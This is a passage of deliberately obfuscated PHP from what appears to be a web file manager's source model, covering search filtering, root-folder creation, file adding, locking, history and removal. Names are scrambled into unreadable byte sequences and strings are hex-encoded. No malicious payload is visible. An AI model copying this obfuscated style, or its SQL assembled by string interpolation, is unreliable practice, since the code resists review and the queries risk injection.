$ğ«Ğ¨–æ) { $şÈ¯¯é =& $_SERVER[ä¿÷‹µ±]; $¼×åƒš = array(); $èØ“Ò¨á = array($şÈ¯¯é[432] => $¢Ôé©Í); $Öî»È©ú = $this->field($şÈ¯¯é[2109])->where($èØ“Ò¨á)->select(); $˜š»–ë = array_to_keyvalue(array_filter_by_field($Öî»È©ú, $şÈ¯¯é[410], $şÈ¯¯é[88]), $şÈ¯¯é[12], $şÈ¯¯é[402]); $¼×åƒš = array_merge($¼×åƒš, array_to_keyvalue($Öî»È©ú, $şÈ¯¯é[12], $şÈ¯¯é[402])); if (!$˜š»–ë) { return $¼×åƒš; } $èØ“Ò¨á = array($şÈ¯¯é[432] => array($şÈ¯¯é[7], $˜š»–ë)); $Öî»È©ú = $this->field($şÈ¯¯é[2109])->where($èØ“Ò¨á)->limit($ğ«Ğ¨–æ)->select(); $¼×åƒš = array_merge($¼×åƒš, array_to_keyvalue($Öî»È©ú, $şÈ¯¯é[12], $şÈ¯¯é[402])); $¼×åƒš = array_slice($¼×åƒš, 0, $ğ«Ğ¨–æ); return $¼×åƒš; } private function _listSearchBindPinyin($èì˜‹°ı, &$Ü„µÙ, &$ë×­Õçà) { $¤¢®ğşâ =& $_SERVER[ä¿÷‹µ±]; if (!isset($èì˜‹°ı[$¤¢®ğşâ[1944]]) || !$èì˜‹°ı[$¤¢®ğşâ[1944]]) { return; } if (!Input::check($èì˜‹°ı[$¤¢®ğşâ[1944]], $¤¢®ğşâ[318]) || strlen($èì˜‹°ı[$¤¢®ğşâ[1944]]) < 2) { return; } $„ÁŞ¡‡Ö = "\x4c\105\x46\124\x20\112\117\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\163\157\165\162\143\145\137\155\145\164\141\40\x6d\x65\164\141\x20\x6f\156\x20\x73\157\x75\x72\x63\145\x2e\x73\x6f\165\x72\x63\145\111\104\40\x3d\40\155\145\164\x61\56\163\x6f\x75\x72\143\145\111\104"; $¨ª¨ÜÉô = array(); $ë×­Õçà = str_replace(array($¤¢®ğşâ[231], $¤¢®ğşâ[53], $¤¢®ğşâ[2110]), $¤¢®ğşâ[12], $ë×­Õçà); $ë×­Õçà = $¤¢®ğşâ[438] . str_replace($¤¢®ğşâ[50], $¤¢®ğşâ[439], $ë×­Õçà); $¦–òÆ‰ = $Ü„µÙ[$¤¢®ğşâ[32]]; unset($Ü„µÙ[$¤¢®ğşâ[32]]); foreach ($Ü„µÙ as $¤²áô‚„ => $¯©ƒöøò) { $¨ª¨ÜÉô[$¤¢®ğşâ[438] . $¤²áô‚„] = $¯©ƒöøò; } foreach ($¦–òÆ‰ as $­­£·ğé) { $¨ª¨ÜÉô[] = array($¤¢®ğşâ[443] => $­­£·ğé, $¤¢®ğşâ[1022] => $¤¢®ğşâ[1948], array($¤¢®ğşâ[2111] => $­­£·ğé, $¤¢®ğşâ[2112] => array($¤¢®ğşâ[7], array($¤¢®ğşâ[465], $¤¢®ğşâ[464])))); } $this->join($„ÁŞ¡‡Ö); $Ü„µÙ = $¨ª¨ÜÉô; } private function _parseSearchWhere($êÇ ¹Ó) { $»å»¸—† =& $_SERVER[ä¿÷‹µ±]; $›ô¥‡” = array(); if (isset($êÇ ¹Ó[$»å»¸—†[780]]) && $êÇ ¹Ó[$»å»¸—†[780]]) { $›ô¥‡”[$»å»¸—†[85]] = array($»å»¸—†[2113], $êÇ ¹Ó[$»å»¸—†[780]]); } if (isset($êÇ ¹Ó[$»å»¸—†[497]]) && $êÇ ¹Ó[$»å»¸—†[497]]) { $â¦ÉË¼­ = array($»å»¸—†[2114], $êÇ ¹Ó[$»å»¸—†[497]]); if ($›ô¥‡”[$»å»¸—†[85]]) { $›ô¥‡”[$»å»¸—†[85]] = array($›ô¥‡”[$»å»¸—†[85]], $â¦ÉË¼­, $»å»¸—†[2115]); } else { $›ô¥‡”[$»å»¸—†[85]] = $â¦ÉË¼­; } } if (isset($êÇ ¹Ó[$»å»¸—†[2107]]) && $êÇ ¹Ó[$»å»¸—†[2107]] > 0) { $›ô¥‡”[$»å»¸—†[76]] = array($»å»¸—†[2113], $êÇ ¹Ó[$»å»¸—†[2107]]); } if (isset($êÇ ¹Ó[$»å»¸—†[2108]]) && $êÇ ¹Ó[$»å»¸—†[2108]]) { $â¦ÉË¼­ = array($»å»¸—†[2114], $êÇ ¹Ó[$»å»¸—†[2108]]); if ($›ô¥‡”[$»å»¸—†[76]]) { $›ô¥‡”[$»å»¸—†[76]] = array($›ô¥‡”[$»å»¸—†[76]], $â¦ÉË¼­, $»å»¸—†[2115]); } else { $›ô¥‡”[$»å»¸—†[76]] = $â¦ÉË¼­; } } if (isset($êÇ ¹Ó[$»å»¸—†[600]]) && $êÇ ¹Ó[$»å»¸—†[600]]) { $›ô¥‡”[] = array($»å»¸—†[456] => $êÇ ¹Ó[$»å»¸—†[600]], $»å»¸—†[454] => $êÇ ¹Ó[$»å»¸—†[600]], $»å»¸—†[1022] => $»å»¸—†[1948]); } if (isset($êÇ ¹Ó[$»å»¸—†[412]]) && $êÇ ¹Ó[$»å»¸—†[412]]) { $¼ª‡¤¼Ç = $êÇ ¹Ó[$»å»¸—†[412]]; if ($¼ª‡¤¼Ç == $»å»¸—†[75]) { $›ô¥‡”[$»å»¸—†[410]] = 1; } else { if ($¼ª‡¤¼Ç == $»å»¸—†[2116]) { $›ô¥‡”[$»å»¸—†[410]] = 0; } else { if ($¼ª‡¤¼Ç) { $¼ª‡¤¼Ç = is_array($¼ª‡¤¼Ç) ? $¼ª‡¤¼Ç : explode($»å»¸—†[50], $¼ª‡¤¼Ç); $›ô¥‡”[$»å»¸—†[412]] = array($»å»¸—†[418], $¼ª‡¤¼Ç); $›ô¥‡”[$»å»¸—†[410]] = 0; } } } } $this->_parseSearchParent($êÇ ¹Ó, $›ô¥‡”); if (isset($êÇ ¹Ó[$»å»¸—†[1944]]) && trim($êÇ ¹Ó[$»å»¸—†[1944]])) { $ø˜ç§«Ò = trim($êÇ ¹Ó[$»å»¸—†[1944]]); $“µİ¶‰Ä = explode($»å»¸—†[53], $ø˜ç§«Ò); if (strlen($ø˜ç§«Ò) > 2 && (substr($ø˜ç§«Ò, 0, 1) == $»å»¸—†[118] && substr($ø˜ç§«Ò, -1) == $»å»¸—†[118]) || substr($ø˜ç§«Ò, 0, 1) == $»å»¸—†[58] && substr($ø˜ç§«Ò, -1) == $»å»¸—†[58]) { $ø˜ç§«Ò = substr($ø˜ç§«Ò, 1, -1); $“µİ¶‰Ä = array($ø˜ç§«Ò); } $›ô¥‡”[$»å»¸—†[32]] = array(array($»å»¸—†[550], $»å»¸—†[1946] . $ø˜ç§«Ò . $»å»¸—†[1946])); if (count($“µİ¶‰Ä) > 1) { $›ô¥‡”[$»å»¸—†[32]] = array(); foreach ($“µİ¶‰Ä as $í úÕëÏ) { if (!trim($í úÕëÏ)) { continue; } $›ô¥‡”[$»å»¸—†[32]][] = array($»å»¸—†[550], $»å»¸—†[1946] . trim($í úÕëÏ) . $»å»¸—†[1946]); } } } return $›ô¥‡”; } private function _parseSearchParent($¿Íº ±, &$ËŸ®½ÖÜ) { $›ŸêóÇ =& $_SERVER[ä¿÷‹µ±]; if (!isset($¿Íº ±[$›ŸêóÇ[432]]) || !$¿Íº ±[$›ŸêóÇ[432]]) { return; } $ìÇñô·“ = $this->pathInfo($¿Íº ±[$›ŸêóÇ[432]]); $éğöª = $ìÇñô·“[$›ŸêóÇ[432]] . $›ŸêóÇ[12] === $›ŸêóÇ[197]; $¶Š÷ç¶˜ = $ìÇñô·“[$›ŸêóÇ[411]] == $›ŸêóÇ[515]; if ($ìÇñô·“[$›ŸêóÇ[532]] == $›ŸêóÇ[533]) { $—œ­«™è = $this->sourceInfo($¿Íº ±[$›ŸêóÇ[432]]); $ìÇñô·“[$›ŸêóÇ[521]] = $—œ­«™è[$›ŸêóÇ[521]]; } $ËŸ®½ÖÜ[$›ŸêóÇ[590]] = array($›ŸêóÇ[550], $ìÇñô·“[$›ŸêóÇ[521]] . $¿Íº ±[$›ŸêóÇ[432]] . $›ŸêóÇ[551]); $Şú§Êıü = isset($¿Íº ±[$›ŸêóÇ[1809]]) && in_array($›ŸêóÇ[515], $¿Íº ±[$›ŸêóÇ[1809]]); if (!$Şú§Êıü || !$¶Š÷ç¶˜ || !$éğöª || !$ìÇñô·“[$›ŸêóÇ[413]]) { return; } if (!AuthModel::authCheckRoot($ìÇñô·“[$›ŸêóÇ[413]][$›ŸêóÇ[414]])) { return; } $‰–Å¨ÄØ = $ìÇñô·“[$›ŸêóÇ[505]] . $›ŸêóÇ[12]; if ($‰–Å¨ÄØ == $›ŸêóÇ[88]) { unset($ËŸ®½ÖÜ[$›ŸêóÇ[590]]); $ËŸ®½ÖÜ[$›ŸêóÇ[411]] = self::TYPE_GROUP; return; } $à‹İÊ‘À = Model($›ŸêóÇ[522])->groupChildrenAll($‰–Å¨ÄØ); $àø«ÆÀ = count($à‹İÊ‘À); if ($àø«ÆÀ <= 1) { return; } $Øİıâ‹ = array($›ŸêóÇ[432] => 0, $›ŸêóÇ[411] => self::TYPE_GROUP, $›ŸêóÇ[505] => array($›ŸêóÇ[7], $à‹İÊ‘À)); $™Ó¢İÑ = $this->field($›ŸêóÇ[2117])->where($Øİıâ‹)->limit($àø«ÆÀ)->select(); $ËŸ®½ÖÜ[$›ŸêóÇ[590]] = array(); foreach ($™Ó¢İÑ as $¬ªÆ«é¢) { $ËŸ®½ÖÜ[$›ŸêóÇ[590]][] = array($›ŸêóÇ[550], $›ŸêóÇ[531] . $¬ªÆ«é¢[$›ŸêóÇ[402]] . $›ŸêóÇ[551]); } $ËŸ®½ÖÜ[$›ŸêóÇ[590]][] = $›ŸêóÇ[1948]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($®–ÒãÑ) { $·®œçê½ =& $_SERVER[ä¿÷‹µ±]; $“ÄÓÉ”ß = Model($·®œçê½[513])->where(array($·®œçê½[1669] => $®–ÒãÑ))->find(); $²—ÎÛŒÃ = $this->_mkdirRoot(SourceModel::TYPE_USER, $®–ÒãÑ, $“ÄÓÉ”ß[$·®œçê½[32]]); $this->userDesktopAdd($²—ÎÛŒÃ); return $²—ÎÛŒÃ; } public function userDesktopAdd($Ç¾•‚´…) { $”—µäì¨ =& $_SERVER[ä¿÷‹µ±]; $˜ş¬¶“ = LNG($”—µäì¨[2118]); $‘ğ¥›Ü× = $this->mkdir($Ç¾•‚´…, $˜ş¬¶“); $this->metaSet($‘ğ¥›Ü×, $”—µäì¨[2119], $”—µäì¨[88]); $this->metaSet($Ç¾•‚´…, $”—µäì¨[2120], $‘ğ¥›Ü×); } public function userPathSafeAdd($¿íµˆ”®) { $é²äï¼ï =& $_SERVER[ä¿÷‹µ±]; $éùçƒ¾ = Model($é²äï¼ï[513])->getInfoFull($¿íµˆ”®); if (!$éùçƒ¾) { return !1; } if (_get($éùçƒ¾, $é²äï¼ï[536])) { return $éùçƒ¾[$é²äï¼ï[466]][$é²äï¼ï[2121]]; } $†å‹†Õ€ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¿íµˆ”®, $é²äï¼ï[2122], $é²äï¼ï[433]); Model($é²äï¼ï[513])->metaSet($¿íµˆ”®, $é²äï¼ï[2121], $†å‹†Õ€); $this->metaSet($†å‹†Õ€, $é²äï¼ï[2123], $¿íµˆ”®); return $†å‹†Õ€; } public function groupRootAdd($ó”šÀ˜) { $Ÿ§„®ñ‚ =& $_SERVER[ä¿÷‹µ±]; $áã ¡¶Ü = Model($Ÿ§„®ñ‚[522])->where(array($Ÿ§„®ñ‚[1938] => $ó”šÀ˜))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ó”šÀ˜, $áã ¡¶Ü[$Ÿ§„®ñ‚[32]]); } public function systemRootPathAdd($½ÁªÚÍ) { if ($½ÁªÚÍ != $_SERVER[ä¿÷‹µ±][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $½ÁªÚÍ); } public function userRootRemove($š†Œ²Œ) { $Ë­Á¸û· = $this->sourceRoot(SourceModel::TYPE_USER, $š†Œ²Œ, !0); foreach ($Ë­Á¸û· as $úñå¤„) { if (!$úñå¤„) { continue; } $this->remove($úñå¤„[$_SERVER[ä¿÷‹µ±][402]], !1); } } public function groupRootRemove($ÏÓ¬¬€) { $“êËŠ¿ = $this->sourceRoot(SourceModel::TYPE_GROUP, $ÏÓ¬¬€); if (!$“êËŠ¿) { return; } $this->remove($“êËŠ¿[$_SERVER[ä¿÷‹µ±][402]], !1); } private function _mkdirRoot($œì©Ğ£‰, $êİÁöŠ‹, $ÖŸ÷Úúê, $š½æø•“ = '') { $õŸ’ëÀÇ =& $_SERVER[ä¿÷‹µ±]; $š›Ç¡× = array($õŸ’ëÀÇ[401] => 0, $õŸ’ëÀÇ[586] => $œì©Ğ£‰, $õŸ’ëÀÇ[587] => $êİÁöŠ‹, $õŸ’ëÀÇ[583] => 1, $õŸ’ëÀÇ[588] => USER_ID, $õŸ’ëÀÇ[589] => USER_ID, $õŸ’ëÀÇ[584] => $š½æø•“, $õŸ’ëÀÇ[590] => $õŸ’ëÀÇ[531], $õŸ’ëÀÇ[430] => 0, $õŸ’ëÀÇ[585] => 0, $õŸ’ëÀÇ[469] => 0, $õŸ’ëÀÇ[591] => $õŸ’ëÀÇ[12]); if ($´ÄŸ§–ç = $this->where($š›Ç¡×)->find()) { return $´ÄŸ§–ç[$õŸ’ëÀÇ[402]]; } $èø‹¯ş = "\115\x6f\144\x65\154\x53\x6f\x75\162\143\145\56\x6d\153\x64\x69\x72\x52\x6f\x6f\x74\x2e{$œì©Ğ£‰}\x2e{$êİÁöŠ‹}\56" . $ÖŸ÷Úúê; CacheLock::lock($èø‹¯ş); $š›Ç¡×[$õŸ’ëÀÇ[32]] = $ÖŸ÷Úúê; $—í™…¡Ğ = $this->add($š›Ç¡×); $‘ÃŠ¼¿† = array($õŸ’ëÀÇ[592] => short_id($—í™…¡Ğ)); $this->where(array($õŸ’ëÀÇ[417] => $—í™…¡Ğ))->save($‘ÃŠ¼¿†); CacheLock::unlock($èø‹¯ş); return $—í™…¡Ğ; } private function sourceRoot($†ÔÀßõ, $êØÕÍÌğ, $Şº¬ú = false) { $ƒ³ËÚÏ¨ =& $_SERVER[ä¿÷‹µ±]; $§Şß‚â‰ = array($ƒ³ËÚÏ¨[401] => 0, $ƒ³ËÚÏ¨[586] => $†ÔÀßõ, $ƒ³ËÚÏ¨[587] => $êØÕÍÌğ); if ($Şº¬ú) { $–‹İëˆ = $this->where($§Şß‚â‰)->select(); return $–‹İëˆ ? $–‹İëˆ : array(); } $ˆ¿¤•Ì = $this->where($§Şß‚â‰)->find(); return $ˆ¿¤•Ì ? $ˆ¿¤•Ì : array(); } public function sourceRootGroup($¬ÉÌÌÔŒ) { $ÙÍß–²ƒ =& $_SERVER[ä¿÷‹µ±]; if (is_string($¬ÉÌÌÔŒ)) { $¬ÉÌÌÔŒ = array($¬ÉÌÌÔŒ); } $¶Æ‹µÛ  = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¬ÉÌÌÔŒ, $ÙÍß–²ƒ[188]); $¿ÍìÀ›õ = array($ÙÍß–²ƒ[369] => $¶Æ‹µÛ , $ÙÍß–²ƒ[366] => array($ÙÍß–²ƒ[778] => count($¬ÉÌÌÔŒ))); $this->_listDataApply($¿ÍìÀ›õ[$ÙÍß–²ƒ[369]]); $this->_listMake($¿ÍìÀ›õ); return array_to_keyvalue($¿ÍìÀ›õ[$ÙÍß–²ƒ[82]], $ÙÍß–²ƒ[505]); } public function mkfile($© ã¨ñ, $¢ŸÙšì„, $²ÖàúªÅ = '', $ğ£§†ûù = REPEAT_RENAME) { $òöÊ¨– =& $_SERVER[ä¿÷‹µ±]; $¡ñˆÄ…˜ = Model($òöÊ¨–[609])->addFileByContent($²ÖàúªÅ, $¢ŸÙšì„); return $this->_createFileCall($© ã¨ñ, $¢ŸÙšì„, $¡ñˆÄ…˜, $ğ£§†ûù, $òöÊ¨–[1360]); } public function addFile($…Õ¦ìÈ, $ü³”¶÷, $ı®™¹ÜÅ, $ˆ‚œ« = false, $¶“ì•Ï = REPEAT_RENAME) { $·“•Á¡” = Model($_SERVER[ä¿÷‹µ±][609])->addFile($ü³”¶÷, $ı®™¹ÜÅ, $ˆ‚œ«); return $this->_createFileCall($…Õ¦ìÈ, $ı®™¹ÜÅ, $·“•Á¡”, $¶“ì•Ï); } public function addFileByFileID($Ô¶ş±ë, $¨ä…­˜, $Ä…Á¿˜’, $¾È¢‰ª² = REPEAT_RENAME) { $…ï¯äÛü =& $_SERVER[ä¿÷‹µ±]; $Ú»ÎÂàï = Model($…ï¯äÛü[609])->find($¨ä…­˜); Model($…ï¯äÛü[609])->linkAdd($¨ä…­˜); return $this->_createFileCall($Ô¶ş±ë, $Ä…Á¿˜’, $Ú»ÎÂàï, $¾È¢‰ª²); } public function addFileByRemote($ÃÜĞ¼, $Éîª¹×, $ä‹²ŒØ, $½óóŒª€ = array(), $’ÈŞ = REPEAT_RENAME) { $°½¢Ï½Î = Model($_SERVER[ä¿÷‹µ±][609])->addFileByRemote($Éîª¹×, $ä‹²ŒØ, $½óóŒª€); return $this->_createFileCall($ÃÜĞ¼, $ä‹²ŒØ, $°½¢Ï½Î, $’ÈŞ); } private function _createFileCall($…ıÏÑ”í, $Á­«ä‰à, $Åğ¶ Öä, $ÊñÉà¹, $èÑ§­ë· = "\165\x70\x6c\x6f\141\144") { $•ŠÏœä =& $_SERVER[ä¿÷‹µ±]; $‹–¢¸¹ü = !1; $this->setMasterDB(); $this->lockWriteStart($…ıÏÑ”í, $Á­«ä‰à); $¦’ö“Û = $this->fileNameExist($…ıÏÑ”í, $Á­«ä‰à); $ÉÑ«…Ëù = $this->_createFile($…ıÏÑ”í, $Á­«ä‰à, $Åğ¶ Öä, $ÊñÉà¹, $‹–¢¸¹ü); if (!$‹–¢¸¹ü) { Model($•ŠÏœä[471])->remove($Åğ¶ Öä[$•ŠÏœä[468]]); } if ($‹–¢¸¹ü && $ÉÑ«…Ëù && $ÉÑ«…Ëù != $¦’ö“Û) { Model($•ŠÏœä[2091])->eventCreate($ÉÑ«…Ëù, $èÑ§­ë·); } $this->lockWriteEnd($…ıÏÑ”í, $Á­«ä‰à); return $ÉÑ«…Ëù; } public function mkdir($³öı´Ÿø, $ïËĞòş, $·‘ÉæÎæ = REPEAT_SKIP) { $š Îí• =& $_SERVER[ä¿÷‹µ±]; $this->setMasterDB(); $¡´æÃıÜ = $this->sourceInfo($³öı´Ÿø); if (!$¡´æÃıÜ) { return !1; } $this->lockWriteStart($³öı´Ÿø, $ïËĞòş); if ($·‘ÉæÎæ !== !1) { $Ô×üü”İ = $this->fileNameExist($³öı´Ÿø, $ïËĞòş); if ($Ô×üü”İ && $·‘ÉæÎæ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($³öı´Ÿø, $ïËĞòş); return $Ô×üü”İ; } $ïËĞòş = $this->fileNameAuto($³öı´Ÿø, $ïËĞòş, $·‘ÉæÎæ); } $Ä¯òî = array($š Îí•[583] => 1, $š Îí•[420] => $ïËĞòş, $š Îí•[584] => $š Îí•[12], $š Îí•[469] => 0, $š Îí•[585] => 0); $˜ä¸ò—Ä = $this->_addSource($Ä¯òî, $¡´æÃıÜ); Model($š Îí•[2091])->eventCreate($˜ä¸ò—Ä, $š Îí•[1361]); $this->lockWriteEnd($³öı´Ÿø, $ïËĞòş); return $˜ä¸ò—Ä; } public function listSourceRoot($üä«·ª, $›İµ¼Ô„, $«¶ï¸û¥ = "\163\157\165\x72\x63\x65\111\x44\54\x74\x61\162\x67\145\x74\111\104\54\163\151\172\145") { $«Ê‹Ø„í =& $_SERVER[ä¿÷‹µ±]; $Àù…Ëë² = $«Ê‹Ø„í[378]; $ıÒ¯Î¬³ = array(); $ñï÷¥öÊ = 1024 * 50; $âèŞ”ÖÌ = is_array($âèŞ”ÖÌ) ? $âèŞ”ÖÌ : array(); $‰ú¬à«÷ = count($›İµ¼Ô„); $†õİÖşğ = $this->tablePrefix . $«Ê‹Ø„í[2124]; for ($÷ı¯Á´– = 0; $÷ı¯Á´– < $‰ú¬à«÷; $÷ı¯Á´–++) { $„“ü‘“¡ = $›İµ¼Ô„[$÷ı¯Á´–]; $Àù…Ëë² .= "\x53\105\114\105\103\x54\40\x2a\40\106\122\x4f\115\x20\x28\x53\x45\114\105\103\x54\x20{$«¶ï¸û¥}\x20\x46\x52\117\115\x20\x60{$†õİÖşğ}\x60\40\127\x48\105\122\x45\x20"; $Àù…Ëë² .= "\140\x70\x61\162\x65\x6e\164\x49\x44\140\x3d\60\40\101\116\104\x20\x60\164\141\162\x67\x65\x74\x49\104\140\75{$„“ü‘“¡}\x20\101\x4e\x44\x20\x60\164\141\162\x67\145\x74\124\171\x70\145\140\75{$üä«·ª}\40\154\x69\155\x69\x74\x20\61\x29\x20\141\163\40\x74\x62\x5f{$÷ı¯Á´–}\40\125\116\111\117\x4e\x20\x41\x4c\114\40"; if ((strlen($Àù…Ëë²) >= $ñï÷¥öÊ || $÷ı¯Á´– == $‰ú¬à«÷ - 1) && $Àù…Ëë²) { $Àù…Ëë² = substr($Àù…Ëë², 0, -strlen($«Ê‹Ø„í[1060])); $­ÇàŞ¹ç = $this->query($Àù…Ëë²); $Àù…Ëë² = $«Ê‹Ø„í[12]; $ıÒ¯Î¬³ = array_merge($ıÒ¯Î¬³, $­ÇàŞ¹ç); } } return $ıÒ¯Î¬³; } private function _createFile($ñ—í±ê, $‡­Œ±ë’, $»Ìœ¦ªË, $±·ŸÀğ , &$«¯áÇÒ) { $‘’­ŒÅ… =& $_SERVER[ä¿÷‹µ±]; $úÀ¾åÍ× = $this->sourceInfo($ñ—í±ê); if (!$»Ìœ¦ªË || !$úÀ¾åÍ×) { return !1; } if ($±·ŸÀğ  !== !1) { $Ä»û‘¦ß = $this->fileNameExist($ñ—í±ê, $‡­Œ±ë’); } $«¯áÇÒ = !0; if ($±·ŸÀğ  && $Ä»û‘¦ß) { if ($±·ŸÀğ  == REPEAT_SKIP) { $«¯áÇÒ = !1; return $Ä»û‘¦ß; } else { if ($±·ŸÀğ  == REPEAT_REPLACE) { $¨¸“Ñ˜ê = $this->sourceInfo($Ä»û‘¦ß); $¥õ¬éòÖ = $this->fileHistory($¨¸“Ñ˜ê, $»Ìœ¦ªË[$‘’­ŒÅ…[468]], $»Ìœ¦ªË[$‘’­ŒÅ…[76]]); if (!$¥õ¬éòÖ) { $«¯áÇÒ = !1; } else { $this->folderSizeReset($ñ—í±ê); } return $Ä»û‘¦ß; } else { $‡­Œ±ë’ = $this->fileNameAuto($ñ—í±ê, $‡­Œ±ë’, $±·ŸÀğ , !1); } } } $¹¨û¥³ = array($‘’­ŒÅ…[583] => 0, $‘’­ŒÅ…[420] => $‡­Œ±ë’, $‘’­ŒÅ…[584] => substr(get_path_ext($‡­Œ±ë’), 0, 10), $‘’­ŒÅ…[469] => $»Ìœ¦ªË[$‘’­ŒÅ…[468]], $‘’­ŒÅ…[585] => $»Ìœ¦ªË[$‘’­ŒÅ…[76]]); $óİÔÇÀ® = $this->_addSource($¹¨û¥³, $úÀ¾åÍ×); $this->folderSizeReset($ñ—í±ê, intval($¹¨û¥³[$‘’­ŒÅ…[76]])); return $óİÔÇÀ®; } protected function fileHistory($–™é¡Ïó, $Óòşš“Ü, $´Î—´ğ³) { $¨ì¥á™ =& $_SERVER[ä¿÷‹µ±]; $À¶”Çàæ = defined($¨ì¥á™[475]) ? USER_ID : $¨ì¥á™[197]; if ($–™é¡Ïó[$¨ì¥á™[468]] == $Óòşš“Ü) { return !1; } $this->checkLock($–™é¡Ïó[$¨ì¥á™[402]], $Óòşš“Ü); Model($¨ì¥á™[2125])->addHistory($–™é¡Ïó); $È©Éİ¢ñ = array($¨ì¥á™[589] => $À¶”Çàæ, $¨ì¥á™[424] => time(), $¨ì¥á™[468] => $Óòşš“Ü, $¨ì¥á™[76] => $´Î—´ğ³); $this->where(array($¨ì¥á™[417] => $–™é¡Ïó[$¨ì¥á™[402]]))->save($È©Éİ¢ñ); $this->sourceCacheClear($–™é¡Ïó[$¨ì¥á™[402]]); return !0; } public function checkLock($ÇÛÅÈÆâ, $‰Ò­Ó¸Ê) { $ó¦ÕÇäĞ =& $_SERVER[ä¿÷‹µ±]; $Ä¡§ô¢— = $this->pathInfo($ÇÛÅÈÆâ); if (!$this->fileIsLock($Ä¡§ô¢—, !0)) { return; } $›ØıËÓí = Session::get($ó¦ÕÇäĞ[2126]); $ûŒ¹ã†Ò = substr($Ä¡§ô¢—[$ó¦ÕÇäĞ[32]], 0, -1 - strlen($Ä¡§ô¢—[$ó¦ÕÇäĞ[174]])) . $ó¦ÕÇäĞ[1625] . $›ØıËÓí . $ó¦ÕÇäĞ[10] . $Ä¡§ô¢—[$ó¦ÕÇäĞ[174]]; $ò€®üö = Model($ó¦ÕÇäĞ[609])->find($‰Ò­Ó¸Ê); $this->_createFileCall($Ä¡§ô¢—[$ó¦ÕÇäĞ[432]], $ûŒ¹ã†Ò, $ò€®üö, REPEAT_REPLACE, $ó¦ÕÇäĞ[1360]); $¹ •‰Í‰ = $Ä¡§ô¢—[$ó¦ÕÇäĞ[466]][$ó¦ÕÇäĞ[548]]; $°¹ö“–Ş = $¹ •‰Í‰[$ó¦ÕÇäĞ[542]] ? $¹ •‰Í‰[$ó¦ÕÇäĞ[542]] : $¹ •‰Í‰[$ó¦ÕÇäĞ[32]]; show_json(LNG($ó¦ÕÇäĞ[2127]) . $ó¦ÕÇäĞ[2128] . LNG($ó¦ÕÇäĞ[2129]) . $ó¦ÕÇäĞ[2130] . $°¹ö“–Ş . $ó¦ÕÇäĞ[2131], !1); } public function fileIsLock($şÀ†», $ºÄ‚ş† = false) { $Œñòõ’ì =& $_SERVER[ä¿÷‹µ±]; if (!isset($şÀ†»[$Œñòõ’ì[466]]) || !$şÀ†»[$Œñòõ’ì[466]][$Œñòõ’ì[545]]) { return !1; } if ($şÀ†»[$Œñòõ’ì[466]][$Œñòõ’ì[545]] != USER_ID) { return !0; } $ó’Ê’¿ = $GLOBALS[$Œñòõ’ì[6]][$Œñòõ’ì[89]][$Œñòõ’ì[546]]; if ($şÀ†»[$Œñòõ’ì[466]][$Œñòõ’ì[547]] <= time() - $ó’Ê’¿) { $this->metaSet($şÀ†»[$Œñòõ’ì[402]], $Œñòõ’ì[545], null); $this->metaSet($şÀ†»[$Œñòõ’ì[402]], $Œñòõ’ì[547], null); } if ($ºÄ‚ş†) { $this->metaSet($şÀ†»[$Œñòõ’ì[402]], $Œñòõ’ì[547], time()); } return !1; } private function _addSource($îØ¶ı‘, $¡¡ı¶¦ï) { $ØÚªÈÓ¢ =& $_SERVER[ä¿÷‹µ±]; $¼Ô‹Ñ– = defined($ØÚªÈÓ¢[475]) ? USER_ID : $ØÚªÈÓ¢[197]; $ëîâ·Ñˆ = array($ØÚªÈÓ¢[586] => $¡¡ı¶¦ï[$ØÚªÈÓ¢[411]], $ØÚªÈÓ¢[587] => $¡¡ı¶¦ï[$ØÚªÈÓ¢[505]], $ØÚªÈÓ¢[588] => $¼Ô‹Ñ–, $ØÚªÈÓ¢[589] => $¼Ô‹Ñ–, $ØÚªÈÓ¢[401] => $¡¡ı¶¦ï[$ØÚªÈÓ¢[402]], $ØÚªÈÓ¢[590] => $¡¡ı¶¦ï[$ØÚªÈÓ¢[521]] . $¡¡ı¶¦ï[$ØÚªÈÓ¢[402]] . $ØÚªÈÓ¢[50], $ØÚªÈÓ¢[430] => 0, $ØÚªÈÓ¢[591] => $ØÚªÈÓ¢[12]); $îØ¶ı‘ = array_merge($ëîâ·Ñˆ, $îØ¶ı‘); $this->updateModifyTime($îØ¶ı‘[$ØÚªÈÓ¢[432]]); $¼¹Ù‹è— = $ØÚªÈÓ¢[2132] . $¡¡ı¶¦ï[$ØÚªÈÓ¢[402]]; if (isset(self::$cacheChildList[$¼¹Ù‹è—])) { unset(self::$cacheChildList[$¼¹Ù‹è—]); } static $İš¾²¤ = false; if (!$İš¾²¤) { Hook::trigger($ØÚªÈÓ¢[573], $îØ¶ı‘); $İš¾²¤ = !0; } $¯½æâ³® = $this->add($îØ¶ı‘); $…˜É˜Œ´ = array($ØÚªÈÓ¢[592] => short_id($¯½æâ³®)); $this->where(array($ØÚªÈÓ¢[417] => $¯½æâ³®))->save($…˜É˜Œ´); $this->setNamePinyin($¯½æâ³®, $îØ¶ı‘[$ØÚªÈÓ¢[32]]); return $¯½æâ³®; } public function remove($÷«Ç’»ã, $–ÛÇÔ‘˜ = true) { $ş÷Üãù‰ =& $_SERVER[ä¿÷‹µ±]; $ÔâŠûò² = $this->sourceInfo($÷«Ç’»ã); $ÀÒëµ€ = intval($ÔâŠûò²[$ş÷Üãù‰[411]]) === self::TYPE_SYSTEM; $äÛÜ± = Model($ş÷Üãù‰[435])->get($ş÷Üãù‰[2133]) == $ş÷Üãù‰[88]; if ($ÀÒëµ€ || $–ÛÇÔ‘˜ || !$äÛÜ±) { return $this->removeNow($÷«Ç’»ã, $–ÛÇÔ‘˜); } $¡„—ô±Æ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $€½¥Şú§ = $ÔâŠûò²[$ş÷Üãù‰[411]] == self::TYPE_USER ? $ş÷Üãù‰[600] : $ş÷Üãù‰[515]; if ($€½¥Şú§ == $ş÷Üãù‰[600]) { $ÄÅÃÁò = Model($ş÷Üãù‰[513])->getInfo($ÔâŠûò²[$ş÷Üãù‰[505]]); $Ö‰èà¡  = !empty($ÄÅÃÁò[$ş÷Üãù‰[542]]) ? $ÄÅÃÁò[$ş÷Üãù‰[542]] : 